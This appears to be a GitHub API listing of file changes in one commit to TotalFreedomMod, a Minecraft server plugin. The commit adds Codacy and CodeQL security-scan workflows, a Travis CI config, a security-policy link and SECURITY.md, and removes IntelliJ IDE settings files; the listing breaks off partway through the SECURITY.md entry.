[
  {
    "sha": "6b818a9f61040155fcfb8301550e5a91e6295e19",
    "filename": ".github/workflows/codacy-analysis.yml",
    "status": "added",
    "additions": 46,
    "deletions": 0,
    "changes": 46,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/.github/workflows/codacy-analysis.yml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/.github/workflows/codacy-analysis.yml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/.github/workflows/codacy-analysis.yml?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -0,0 +1,46 @@\n+# This workflow checks out code, performs a Codacy security scan\n+# and integrates the results with the\n+# GitHub Advanced Security code scanning feature.  For more information on\n+# the Codacy security scan action usage and parameters, see\n+# https://github.com/codacy/codacy-analysis-cli-action.\n+# For more information on Codacy Analysis CLI in general, see\n+# https://github.com/codacy/codacy-analysis-cli.\n+\n+name: Codacy Security Scan\n+\n+on:\n+  push:\n+    branches: [ development ]\n+  pull_request:\n+    branches: [ development ]\n+\n+jobs:\n+  codacy-security-scan:\n+    name: Codacy Security Scan\n+    runs-on: ubuntu-latest\n+    steps:\n+      # Checkout the repository to the GitHub Actions runner\n+      - name: Checkout code\n+        uses: actions/checkout@v2\n+\n+      # Execute Codacy Analysis CLI and generate a SARIF output with the security issues identified during the analysis\n+      - name: Run Codacy Analysis CLI\n+        uses: codacy/codacy-analysis-cli-action@1.1.0\n+        with:\n+          # Check https://github.com/codacy/codacy-analysis-cli#project-token to get your project token from your Codacy repository\n+          # You can also omit the token and run the tools that support default configurations\n+          project-token: ${{ secrets.CODACY_PROJECT_TOKEN }}\n+          verbose: true\n+          output: results.sarif\n+          format: sarif\n+          # Adjust severity of non-security issues\n+          gh-code-scanning-compat: true\n+          # Force 0 exit code to allow SARIF file generation\n+          # This will handover control about PR rejection to the GitHub side\n+          max-allowed-issues: 2147483647\n+\n+      # Upload the SARIF file generated in the previous step\n+      - name: Upload SARIF results file\n+        uses: github/codeql-action/upload-sarif@v1\n+        with:\n+          sarif_file: results.sarif"
  },
  {
    "sha": "9b81405f91925ce6c7593207d2a8ea45555b8023",
    "filename": ".github/workflows/codeql-analysis.yml",
    "status": "added",
    "additions": 67,
    "deletions": 0,
    "changes": 67,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/.github/workflows/codeql-analysis.yml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/.github/workflows/codeql-analysis.yml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/.github/workflows/codeql-analysis.yml?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -0,0 +1,67 @@\n+# For most projects, this workflow file will not need changing; you simply need\n+# to commit it to your repository.\n+#\n+# You may wish to alter this file to override the set of languages analyzed,\n+# or to provide custom queries or build logic.\n+#\n+# ******** NOTE ********\n+# We have attempted to detect the languages in your repository. Please check\n+# the `language` matrix defined below to confirm you have the correct set of\n+# supported CodeQL languages.\n+#\n+name: \"CodeQL\"\n+\n+on:\n+  push:\n+    branches: [ development ]\n+  pull_request:\n+    # The branches below must be a subset of the branches above\n+    branches: [ development ]\n+  schedule:\n+    - cron: '20 18 * * 1'\n+\n+jobs:\n+  analyze:\n+    name: Analyze\n+    runs-on: ubuntu-latest\n+\n+    strategy:\n+      fail-fast: false\n+      matrix:\n+        language: [ 'java' ]\n+        # CodeQL supports [ 'cpp', 'csharp', 'go', 'java', 'javascript', 'python' ]\n+        # Learn more:\n+        # https://docs.github.com/en/free-pro-team@latest/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#changing-the-languages-that-are-analyzed\n+\n+    steps:\n+    - name: Checkout repository\n+      uses: actions/checkout@v2\n+\n+    # Initializes the CodeQL tools for scanning.\n+    - name: Initialize CodeQL\n+      uses: github/codeql-action/init@v1\n+      with:\n+        languages: ${{ matrix.language }}\n+        # If you wish to specify custom queries, you can do so here or in a config file.\n+        # By default, queries listed here will override any specified in a config file.\n+        # Prefix the list here with \"+\" to use these queries and those in the config file.\n+        # queries: ./path/to/local/query, your-org/your-repo/queries@main\n+\n+    # Autobuild attempts to build any compiled languages  (C/C++, C#, or Java).\n+    # If this step fails, then you should remove it and run the build manually (see below)\n+    - name: Autobuild\n+      uses: github/codeql-action/autobuild@v1\n+\n+    # ‚ÑπÔ∏è Command-line programs to run using the OS shell.\n+    # üìö https://git.io/JvXDl\n+\n+    # ‚úèÔ∏è If the Autobuild fails above, remove it and uncomment the following three lines\n+    #    and modify them (or add more) to build your code if your project\n+    #    uses a compiled language\n+\n+    #- run: |\n+    #   make bootstrap\n+    #   make release\n+\n+    - name: Perform CodeQL Analysis\n+      uses: github/codeql-action/analyze@v1"
  },
  {
    "sha": "76a2ae1db49f33d70d2bc5912e69ac047b5f3a3a",
    "filename": ".github/workflows/maven.yml",
    "status": "modified",
    "additions": 1,
    "deletions": 1,
    "changes": 2,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/.github/workflows/maven.yml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/.github/workflows/maven.yml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/.github/workflows/maven.yml?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -1,4 +1,4 @@\n-name: build\n+name: Maven-Build\n \n on: [push]\n "
  },
  {
    "sha": "f0fcfd1eaa832a1e6f323bdcf8f2967f1ca4cf92",
    "filename": ".gitignore",
    "status": "modified",
    "additions": 5,
    "deletions": 0,
    "changes": 5,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/.gitignore",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/.gitignore",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/.gitignore?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -37,3 +37,8 @@ manifest.mf\n .Trashes\n ehthumbs.db\n Thumbs.db\n+.idea/inspectionProfiles/Project_Default.xml\n+.idea/compiler.xml\n+.idea/encodings.xml\n+.idea/misc.xml\n+.idea/vcs.xml"
  },
  {
    "sha": "86bb373f004dee7e24efbe76494586b3fd2a7059",
    "filename": ".idea/codeStyles/Project.xml",
    "status": "removed",
    "additions": 0,
    "deletions": 46,
    "changes": 46,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/codeStyles/Project.xml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/codeStyles/Project.xml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/.idea/codeStyles/Project.xml?ref=de0d6853b7113af1bc57253cb6a17cf777da8819",
    "patch": "@@ -1,46 +0,0 @@\n-<component name=\"ProjectCodeStyleConfiguration\">\n-  <code_scheme name=\"Project\" version=\"173\">\n-    <JavaCodeStyleSettings>\n-      <option name=\"CLASS_COUNT_TO_USE_IMPORT_ON_DEMAND\" value=\"20\" />\n-      <option name=\"IMPORT_LAYOUT_TABLE\">\n-        <value>\n-          <package name=\"\" withSubpackages=\"true\" static=\"false\" />\n-          <package name=\"\" withSubpackages=\"true\" static=\"true\" />\n-        </value>\n-      </option>\n-    </JavaCodeStyleSettings>\n-    <JetCodeStyleSettings>\n-      <option name=\"PACKAGES_TO_USE_STAR_IMPORTS\">\n-        <value>\n-          <package name=\"java.util\" alias=\"false\" withSubpackages=\"false\" />\n-          <package name=\"kotlinx.android.synthetic\" alias=\"false\" withSubpackages=\"true\" />\n-          <package name=\"io.ktor\" alias=\"false\" withSubpackages=\"true\" />\n-        </value>\n-      </option>\n-      <option name=\"PACKAGES_IMPORT_LAYOUT\">\n-        <value>\n-          <package name=\"\" alias=\"false\" withSubpackages=\"true\" />\n-          <package name=\"java\" alias=\"false\" withSubpackages=\"true\" />\n-          <package name=\"javax\" alias=\"false\" withSubpackages=\"true\" />\n-          <package name=\"kotlin\" alias=\"false\" withSubpackages=\"true\" />\n-          <package name=\"\" alias=\"true\" withSubpackages=\"true\" />\n-        </value>\n-      </option>\n-    </JetCodeStyleSettings>\n-    <codeStyleSettings language=\"JAVA\">\n-      <option name=\"BRACE_STYLE\" value=\"2\" />\n-      <option name=\"CLASS_BRACE_STYLE\" value=\"2\" />\n-      <option name=\"METHOD_BRACE_STYLE\" value=\"2\" />\n-      <option name=\"LAMBDA_BRACE_STYLE\" value=\"2\" />\n-      <option name=\"ELSE_ON_NEW_LINE\" value=\"true\" />\n-      <option name=\"WHILE_ON_NEW_LINE\" value=\"true\" />\n-      <option name=\"CATCH_ON_NEW_LINE\" value=\"true\" />\n-      <option name=\"FINALLY_ON_NEW_LINE\" value=\"true\" />\n-      <option name=\"SPACE_AFTER_TYPE_CAST\" value=\"false\" />\n-      <option name=\"IF_BRACE_FORCE\" value=\"3\" />\n-      <option name=\"DOWHILE_BRACE_FORCE\" value=\"3\" />\n-      <option name=\"WHILE_BRACE_FORCE\" value=\"3\" />\n-      <option name=\"FOR_BRACE_FORCE\" value=\"3\" />\n-    </codeStyleSettings>\n-  </code_scheme>\n-</component>\n\\ No newline at end of file"
  },
  {
    "sha": "0f7bc519db610a2e6290d61d592e9fdac90c8cde",
    "filename": ".idea/codeStyles/codeStyleConfig.xml",
    "status": "removed",
    "additions": 0,
    "deletions": 5,
    "changes": 5,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/codeStyles/codeStyleConfig.xml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/codeStyles/codeStyleConfig.xml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/.idea/codeStyles/codeStyleConfig.xml?ref=de0d6853b7113af1bc57253cb6a17cf777da8819",
    "patch": "@@ -1,5 +0,0 @@\n-<component name=\"ProjectCodeStyleConfiguration\">\n-  <state>\n-    <option name=\"USE_PER_PROJECT_SETTINGS\" value=\"true\" />\n-  </state>\n-</component>"
  },
  {
    "sha": "58d3e43434b28374ccd4791674a2f14650477285",
    "filename": ".idea/compiler.xml",
    "status": "removed",
    "additions": 0,
    "deletions": 17,
    "changes": 17,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/compiler.xml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/compiler.xml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/.idea/compiler.xml?ref=de0d6853b7113af1bc57253cb6a17cf777da8819",
    "patch": "@@ -1,17 +0,0 @@\n-<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n-<project version=\"4\">\n-  <component name=\"CompilerConfiguration\">\n-    <annotationProcessing>\n-      <profile default=\"true\" name=\"Default\" enabled=\"true\" />\n-      <profile name=\"Maven default annotation processors profile\" enabled=\"true\">\n-        <sourceOutputDir name=\"target/generated-sources/annotations\" />\n-        <sourceTestOutputDir name=\"target/generated-test-sources/test-annotations\" />\n-        <outputRelativeToContentRoot value=\"true\" />\n-        <module name=\"TotalFreedomMod\" />\n-      </profile>\n-    </annotationProcessing>\n-    <bytecodeTargetLevel>\n-      <module name=\"TotalFreedomMod\" target=\"1.8\" />\n-    </bytecodeTargetLevel>\n-  </component>\n-</project>\n\\ No newline at end of file"
  },
  {
    "sha": "0400b6652a2b8df56d71794e697b85d9d42a4921",
    "filename": ".idea/encodings.xml",
    "status": "removed",
    "additions": 0,
    "deletions": 8,
    "changes": 8,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/encodings.xml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/encodings.xml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/.idea/encodings.xml?ref=de0d6853b7113af1bc57253cb6a17cf777da8819",
    "patch": "@@ -1,8 +0,0 @@\n-<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n-<project version=\"4\">\n-  <component name=\"Encoding\">\n-    <file url=\"file://$PROJECT_DIR$/src/main/java\" charset=\"UTF-8\" />\n-    <file url=\"file://$PROJECT_DIR$/src/main/resources\" charset=\"UTF-8\" />\n-\t<file url=\"file://$PROJECT_DIR$/src/main/resources\" charset=\"UTF-8\" />\n-  </component>\n-</project>\n\\ No newline at end of file"
  },
  {
    "sha": "be85aa3779eb3df3abcc50c666079887976428c2",
    "filename": ".idea/misc.xml",
    "status": "removed",
    "additions": 0,
    "deletions": 16,
    "changes": 16,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/misc.xml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/misc.xml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/.idea/misc.xml?ref=de0d6853b7113af1bc57253cb6a17cf777da8819",
    "patch": "@@ -1,16 +0,0 @@\n-<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n-<project version=\"4\">\n-  <component name=\"EntryPointsManager\">\n-    <list size=\"1\">\n-      <item index=\"0\" class=\"java.lang.String\" itemvalue=\"org.bukkit.event.EventHandler\" />\n-    </list>\n-  </component>\n-  <component name=\"MavenProjectsManager\">\n-    <option name=\"originalFiles\">\n-      <list>\n-        <option value=\"$PROJECT_DIR$/pom.xml\" />\n-      </list>\n-    </option>\n-  </component>\n-  <component name=\"ProjectRootManager\" version=\"2\" languageLevel=\"JDK_1_8\" default=\"false\" project-jdk-name=\"1.8\" project-jdk-type=\"JavaSDK\" />\n-</project>\n\\ No newline at end of file"
  },
  {
    "sha": "e96534fb27b68192f27f985d3879e173ec77adb8",
    "filename": ".idea/uiDesigner.xml",
    "status": "removed",
    "additions": 0,
    "deletions": 124,
    "changes": 124,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/uiDesigner.xml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/uiDesigner.xml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/.idea/uiDesigner.xml?ref=de0d6853b7113af1bc57253cb6a17cf777da8819",
    "patch": "@@ -1,124 +0,0 @@\n-<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n-<project version=\"4\">\n-  <component name=\"Palette2\">\n-    <group name=\"Swing\">\n-      <item class=\"com.intellij.uiDesigner.HSpacer\" tooltip-text=\"Horizontal Spacer\" icon=\"/com/intellij/uiDesigner/icons/hspacer.png\" removable=\"false\" auto-create-binding=\"false\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"1\" hsize-policy=\"6\" anchor=\"0\" fill=\"1\" />\n-      </item>\n-      <item class=\"com.intellij.uiDesigner.VSpacer\" tooltip-text=\"Vertical Spacer\" icon=\"/com/intellij/uiDesigner/icons/vspacer.png\" removable=\"false\" auto-create-binding=\"false\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"6\" hsize-policy=\"1\" anchor=\"0\" fill=\"2\" />\n-      </item>\n-      <item class=\"javax.swing.JPanel\" icon=\"/com/intellij/uiDesigner/icons/panel.png\" removable=\"false\" auto-create-binding=\"false\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"3\" hsize-policy=\"3\" anchor=\"0\" fill=\"3\" />\n-      </item>\n-      <item class=\"javax.swing.JScrollPane\" icon=\"/com/intellij/uiDesigner/icons/scrollPane.png\" removable=\"false\" auto-create-binding=\"false\" can-attach-label=\"true\">\n-        <default-constraints vsize-policy=\"7\" hsize-policy=\"7\" anchor=\"0\" fill=\"3\" />\n-      </item>\n-      <item class=\"javax.swing.JButton\" icon=\"/com/intellij/uiDesigner/icons/button.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"3\" anchor=\"0\" fill=\"1\" />\n-        <initial-values>\n-          <property name=\"text\" value=\"Button\" />\n-        </initial-values>\n-      </item>\n-      <item class=\"javax.swing.JRadioButton\" icon=\"/com/intellij/uiDesigner/icons/radioButton.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"3\" anchor=\"8\" fill=\"0\" />\n-        <initial-values>\n-          <property name=\"text\" value=\"RadioButton\" />\n-        </initial-values>\n-      </item>\n-      <item class=\"javax.swing.JCheckBox\" icon=\"/com/intellij/uiDesigner/icons/checkBox.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"3\" anchor=\"8\" fill=\"0\" />\n-        <initial-values>\n-          <property name=\"text\" value=\"CheckBox\" />\n-        </initial-values>\n-      </item>\n-      <item class=\"javax.swing.JLabel\" icon=\"/com/intellij/uiDesigner/icons/label.png\" removable=\"false\" auto-create-binding=\"false\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"0\" anchor=\"8\" fill=\"0\" />\n-        <initial-values>\n-          <property name=\"text\" value=\"Label\" />\n-        </initial-values>\n-      </item>\n-      <item class=\"javax.swing.JTextField\" icon=\"/com/intellij/uiDesigner/icons/textField.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"true\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"6\" anchor=\"8\" fill=\"1\">\n-          <preferred-size width=\"150\" height=\"-1\" />\n-        </default-constraints>\n-      </item>\n-      <item class=\"javax.swing.JPasswordField\" icon=\"/com/intellij/uiDesigner/icons/passwordField.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"true\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"6\" anchor=\"8\" fill=\"1\">\n-          <preferred-size width=\"150\" height=\"-1\" />\n-        </default-constraints>\n-      </item>\n-      <item class=\"javax.swing.JFormattedTextField\" icon=\"/com/intellij/uiDesigner/icons/formattedTextField.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"true\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"6\" anchor=\"8\" fill=\"1\">\n-          <preferred-size width=\"150\" height=\"-1\" />\n-        </default-constraints>\n-      </item>\n-      <item class=\"javax.swing.JTextArea\" icon=\"/com/intellij/uiDesigner/icons/textArea.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"true\">\n-        <default-constraints vsize-policy=\"6\" hsize-policy=\"6\" anchor=\"0\" fill=\"3\">\n-          <preferred-size width=\"150\" height=\"50\" />\n-        </default-constraints>\n-      </item>\n-      <item class=\"javax.swing.JTextPane\" icon=\"/com/intellij/uiDesigner/icons/textPane.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"true\">\n-        <default-constraints vsize-policy=\"6\" hsize-policy=\"6\" anchor=\"0\" fill=\"3\">\n-          <preferred-size width=\"150\" height=\"50\" />\n-        </default-constraints>\n-      </item>\n-      <item class=\"javax.swing.JEditorPane\" icon=\"/com/intellij/uiDesigner/icons/editorPane.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"true\">\n-        <default-constraints vsize-policy=\"6\" hsize-policy=\"6\" anchor=\"0\" fill=\"3\">\n-          <preferred-size width=\"150\" height=\"50\" />\n-        </default-constraints>\n-      </item>\n-      <item class=\"javax.swing.JComboBox\" icon=\"/com/intellij/uiDesigner/icons/comboBox.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"true\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"2\" anchor=\"8\" fill=\"1\" />\n-      </item>\n-      <item class=\"javax.swing.JTable\" icon=\"/com/intellij/uiDesigner/icons/table.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"6\" hsize-policy=\"6\" anchor=\"0\" fill=\"3\">\n-          <preferred-size width=\"150\" height=\"50\" />\n-        </default-constraints>\n-      </item>\n-      <item class=\"javax.swing.JList\" icon=\"/com/intellij/uiDesigner/icons/list.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"6\" hsize-policy=\"2\" anchor=\"0\" fill=\"3\">\n-          <preferred-size width=\"150\" height=\"50\" />\n-        </default-constraints>\n-      </item>\n-      <item class=\"javax.swing.JTree\" icon=\"/com/intellij/uiDesigner/icons/tree.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"6\" hsize-policy=\"6\" anchor=\"0\" fill=\"3\">\n-          <preferred-size width=\"150\" height=\"50\" />\n-        </default-constraints>\n-      </item>\n-      <item class=\"javax.swing.JTabbedPane\" icon=\"/com/intellij/uiDesigner/icons/tabbedPane.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"3\" hsize-policy=\"3\" anchor=\"0\" fill=\"3\">\n-          <preferred-size width=\"200\" height=\"200\" />\n-        </default-constraints>\n-      </item>\n-      <item class=\"javax.swing.JSplitPane\" icon=\"/com/intellij/uiDesigner/icons/splitPane.png\" removable=\"false\" auto-create-binding=\"false\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"3\" hsize-policy=\"3\" anchor=\"0\" fill=\"3\">\n-          <preferred-size width=\"200\" height=\"200\" />\n-        </default-constraints>\n-      </item>\n-      <item class=\"javax.swing.JSpinner\" icon=\"/com/intellij/uiDesigner/icons/spinner.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"true\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"6\" anchor=\"8\" fill=\"1\" />\n-      </item>\n-      <item class=\"javax.swing.JSlider\" icon=\"/com/intellij/uiDesigner/icons/slider.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"6\" anchor=\"8\" fill=\"1\" />\n-      </item>\n-      <item class=\"javax.swing.JSeparator\" icon=\"/com/intellij/uiDesigner/icons/separator.png\" removable=\"false\" auto-create-binding=\"false\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"6\" hsize-policy=\"6\" anchor=\"0\" fill=\"3\" />\n-      </item>\n-      <item class=\"javax.swing.JProgressBar\" icon=\"/com/intellij/uiDesigner/icons/progressbar.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"6\" anchor=\"0\" fill=\"1\" />\n-      </item>\n-      <item class=\"javax.swing.JToolBar\" icon=\"/com/intellij/uiDesigner/icons/toolbar.png\" removable=\"false\" auto-create-binding=\"false\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"6\" anchor=\"0\" fill=\"1\">\n-          <preferred-size width=\"-1\" height=\"20\" />\n-        </default-constraints>\n-      </item>\n-      <item class=\"javax.swing.JToolBar$Separator\" icon=\"/com/intellij/uiDesigner/icons/toolbarSeparator.png\" removable=\"false\" auto-create-binding=\"false\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"0\" hsize-policy=\"0\" anchor=\"0\" fill=\"1\" />\n-      </item>\n-      <item class=\"javax.swing.JScrollBar\" icon=\"/com/intellij/uiDesigner/icons/scrollbar.png\" removable=\"false\" auto-create-binding=\"true\" can-attach-label=\"false\">\n-        <default-constraints vsize-policy=\"6\" hsize-policy=\"0\" anchor=\"0\" fill=\"2\" />\n-      </item>\n-    </group>\n-  </component>\n-</project>\n\\ No newline at end of file"
  },
  {
    "sha": "35eb1ddfbbc029bcab630581847471d7f238ec53",
    "filename": ".idea/vcs.xml",
    "status": "removed",
    "additions": 0,
    "deletions": 6,
    "changes": 6,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/vcs.xml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/de0d6853b7113af1bc57253cb6a17cf777da8819/.idea/vcs.xml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/.idea/vcs.xml?ref=de0d6853b7113af1bc57253cb6a17cf777da8819",
    "patch": "@@ -1,6 +0,0 @@\n-<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n-<project version=\"4\">\n-  <component name=\"VcsDirectoryMappings\">\n-    <mapping directory=\"\" vcs=\"Git\" />\n-  </component>\n-</project>\n\\ No newline at end of file"
  },
  {
    "sha": "141c7052c85b4214aed2fd8ed7066df22bad6c7b",
    "filename": ".travis.yml",
    "status": "added",
    "additions": 13,
    "deletions": 0,
    "changes": 13,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/.travis.yml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/.travis.yml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/.travis.yml?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -0,0 +1,13 @@\n+language: java\n+jdk:\n+  - oraclejdk11\n+  - openjdk11\n+notifications:\n+  email: false\n+addons:\n+  apt:\n+    packages:\n+      - sshpass\n+script: mvn clean install\n+after_success:\n+  - ./travis-upload.sh"
  },
  {
    "sha": "49adaceb27ddb12b64eafc4ab74f4d1dfbc3eb1a",
    "filename": "README.md",
    "status": "modified",
    "additions": 3,
    "deletions": 1,
    "changes": 4,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/README.md",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/README.md",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/README.md?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -1,4 +1,4 @@\n-# TotalFreedomMod [![Build Status](https://github.com/TotalFreedomMC/TotalFreedomMod/workflows/build/badge.svg)](https://travis-ci.org/TotalFreedomMC/TotalFreedomMod) [![codebeat badge](https://codebeat.co/badges/89162bad-47be-4418-b1d4-93431b74762e)](https://codebeat.co/projects/github-com-totalfreedommc-totalfreedommod-development)\n+# TotalFreedomMod [![Build Status](https://travis-ci.com/AtlasMediaGroup/TotalFreedomMod.svg?branch=development)](https://travis-ci.com/AtlasMediaGroup/TotalFreedomMod) [![Codacy Badge](https://app.codacy.com/project/badge/Grade/29c0f964da304666bd654bc7b1d556db)](https://www.codacy.com/gh/AtlasMediaGroup/TotalFreedomMod/dashboard?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=AtlasMediaGroup/TotalFreedomMod&amp;utm_campaign=Badge_Grade)\n \n TotalFreedomMod is a CraftBukkit server plugin designed primarily to support the [Official TotalFreedom Minecraft Server](https://totalfreedom.me/). However, you are more than welcome to adapt the source for your own server.\n \n@@ -9,6 +9,8 @@ Please see [CONTRIBUTING.md](CONTRIBUTING.md) if you are interested in developin\n \n For information on how TotalFreedomMod is licensed, please see [LICENSE.md](LICENSE.md).\n \n+For information on our security policy and reporting an issue, please see [SECURITY.md](SECURITY.md)\n+\n ### Compiling ###\n \n You need Maven to build. You'd also need to set the JDK version to Java 8 as that is the current standard as of now."
  },
  {
    "sha": "1224ae03191ffcee5d7ded390974a1bff5b2ef6c",
    "filename": "SECURITY.md",
    "status": "added",
    "additions": 20,
    "deletions": 0,
    "changes": 20,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/SECURITY.md",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/SECURITY.md",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/SECURITY.md?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
